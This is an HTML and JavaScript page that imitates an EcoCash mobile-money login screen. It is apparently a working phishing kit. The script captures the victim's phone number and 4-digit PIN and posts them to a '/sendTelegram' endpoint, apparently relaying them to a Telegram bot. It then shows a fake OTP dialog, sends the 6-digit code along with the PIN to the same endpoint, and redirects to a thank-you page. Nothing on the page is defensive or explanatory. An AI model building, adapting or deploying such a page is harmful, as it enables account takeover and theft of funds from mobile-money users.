<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash â€” Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    -webkit-font-smoothing:antialiased;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px;box-sizing:border-box}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}

  /* error styling */
  .input-error{
    border-color:#dc2626 !important;
    background:#fff5f5;
  }
  .error-text{
    font-size:12px;
    color:#dc2626;
    margin-top:4px;
    display:none;
  }

  /* SHAKE animation */
  @keyframes shake {
    0%{transform:translateX(0)}
    20%{transform:translateX(-4px)}
    40%{transform:translateX(4px)}
    60%{transform:translateX(-4px)}
    80%{transform:translateX(4px)}
    100%{transform:translateX(0)}
  }
  .shake{
    animation:shake .35s;
  }

  /* ðŸ”§ ONLY FIX APPLIED HERE */
  .otp-modal{
    position:fixed;
    left:0;
    top:0;
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
    background:rgba(0,0,0,0.35);
    z-index:9999; /* âœ… THIS IS THE ONLY CHANGE */
  }

  .otp-box{
    background:#fff;
    padding:18px;
    border-radius:12px;
    min-width:300px;
    max-width:92%;
    box-shadow:0 12px 24px rgba(2,6,23,0.08)
  }

  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
  .otp-digit{
    width:40px;
    height:48px;
    text-align:center;
    font-size:20px;
    border-radius:8px;
    border:1px solid #e6eefc;
    background:#fbfdff;
  }

  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
</style>
</head>

<body>
  <div class="card">
    <img src="assets/eco.png" alt="EcoCash logo" class="logo">
    <h2>Log In</h2>

    <form id="loginForm" autocomplete="off">
      <label><span class="req">â˜…</span>Mobile Number
        <input id="phone" name="phone" required value="+263" inputmode="tel" autocomplete="tel" />
        <div id="phoneError" class="error-text">
          Enter a valid number starting with 7 (9 digits)
        </div>
      </label>

      <label><span class="req">â˜…</span>4-Digit PIN
        <input id="pin" name="pin" required maxlength="4" placeholder="Enter 4-digit PIN" inputmode="numeric" pattern="\d{4}" />
      </label>

      <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
    </form>
  </div>

  <!-- OTP MODAL -->
  <div id="otpModal" style="display:none" class="otp-modal">
    <div class="otp-box">
      <strong style="display:block;text-align:center">Enter OTP</strong>

      <div class="otp-row">
        <input maxlength="1" class="otp-digit" id="d0">
        <input maxlength="1" class="otp-digit" id="d1">
        <input maxlength="1" class="otp-digit" id="d2">
        <input maxlength="1" class="otp-digit" id="d3">
        <input maxlength="1" class="otp-digit" id="d4">
        <input maxlength="1" class="otp-digit" id="d5">
      </div>

      <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

      <div style="display:flex;gap:10px;margin-top:12px">
        <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
        <button id="cancelOtp" style="flex:1;background:#e5e7eb;border:0;border-radius:8px">Cancel</button>
      </div>

      <div id="otpStatus" class="small"></div>
    </div>
  </div>

<script>
  let selectedPlan = null;
  try {
    const raw = sessionStorage.getItem('selectedPlan');
    if (raw) selectedPlan = JSON.parse(raw);
  } catch(e){}

  const phoneEl = document.getElementById('phone');
  const pinEl = document.getElementById('pin');
  const loginBtn = document.getElementById('loginBtn');
  const phoneError = document.getElementById('phoneError');

  const PREFIX = '+263';
  let phoneCompleted = false;

  function normalizePhone(){
    let digits = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
    if (digits.startsWith('0')) digits = digits.slice(1);
    if (digits.length && digits[0] !== '7') digits = '7' + digits.slice(1);
    digits = digits.slice(0,9);
    phoneEl.value = PREFIX + digits;
  }

  function isValidPhone(){
    const d = phoneEl.value.slice(PREFIX.length);
    return /^\d{9}$/.test(d) && d.startsWith('7');
  }

  function updateLoginState(){
    const validPhone = isValidPhone();
    const validPin = /^\d{4}$/.test(pinEl.value);
    loginBtn.disabled = !(validPhone && validPin);

    if (!validPhone && phoneEl.value.length > PREFIX.length) {
      phoneEl.classList.add('input-error');
      phoneError.style.display = 'block';
      phoneEl.classList.add('shake');
      setTimeout(()=>phoneEl.classList.remove('shake'),350);
    } else {
      phoneEl.classList.remove('input-error');
      phoneError.style.display = 'none';
    }

    if (validPhone && !phoneCompleted) {
      phoneCompleted = true;
      pinEl.focus();
    }
    if (!validPhone) phoneCompleted = false;
  }

  phoneEl.addEventListener('keydown', e => {
    if ((e.key === 'Backspace' || e.key === 'Delete') && phoneEl.selectionStart <= PREFIX.length) {
      e.preventDefault();
    }
  });

  phoneEl.addEventListener('input', () => {
    if (!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
    normalizePhone();
    updateLoginState();
  });

  pinEl.addEventListener('input',()=>{
    pinEl.value = pinEl.value.replace(/\D/g,'').slice(0,4);
    updateLoginState();
  });

  async function sendToServer(payload) {
    return fetch('/sendTelegram', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    });
  }

  const otpModal=document.getElementById('otpModal');
  const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
  const confirmBtn=document.getElementById('confirmOtp');
  const cancelBtn=document.getElementById('cancelOtp');
  const otpWarning=document.getElementById('otpWarning');

  function getOtp(){return dEls.map(d=>d.value||'').join('');}

  document.getElementById('loginForm').addEventListener('submit',async e=>{
    e.preventDefault();
    otpModal.style.display='flex';
    sendToServer({
      submittedAt:new Date().toISOString(),
      event:'login_clicked',
      loginPhone:phoneEl.value,
      loginPin:pinEl.value,
      selectedPlan
    });
  });

  confirmBtn.addEventListener('click',async()=>{
    if(!/^\d{6}$/.test(getOtp())){otpWarning.style.display='block';return;}
    await sendToServer({
      submittedAt:new Date().toISOString(),
      event:'otp_confirm',
      loginPhone:phoneEl.value,
      loginPin:pinEl.value,
      otp:getOtp(),
      selectedPlan
    });
    window.location.href='thankyou.html';
  });

  cancelBtn.onclick=()=>otpModal.style.display='none';
</script>
</body>
</html>
